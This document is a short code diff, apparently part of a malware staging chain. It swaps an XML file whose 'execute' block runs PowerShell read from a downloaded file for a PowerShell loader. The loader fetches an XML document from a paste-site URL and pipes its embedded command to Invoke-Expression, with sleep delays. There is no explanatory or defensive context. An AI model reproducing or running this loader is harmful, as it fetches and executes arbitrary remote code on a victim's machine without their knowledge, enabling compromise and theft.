@@ -1,21 +1,5 @@
-<?xml version="1.0"?>
-<command>
-   <a>
-     
-      <execute>
-      
-      
-set-location -path "$home";
-start-sleep -s 5;
-$anyfile = get-content ~\downloads\wegood.file | select-object -last 5;
-start-sleep -s 3;
-$scriptblock = [system.management.automation.scriptblock]::create($anyfile);
-start-sleep -s 5;
-& $scriptblock;
-echo 'Updated';
-start-sleep -s 3;
-      
-      
-      </execute>
-   </a>
-</command>
+$fawq = New-Object System.Xml.XmlDocument
+start-sleep -s 10
+$fawq.Load("https://0paste.com/348802-0036aaf3.txt")
+start-sleep -s 12
+$fawq.command.a.execute | iex
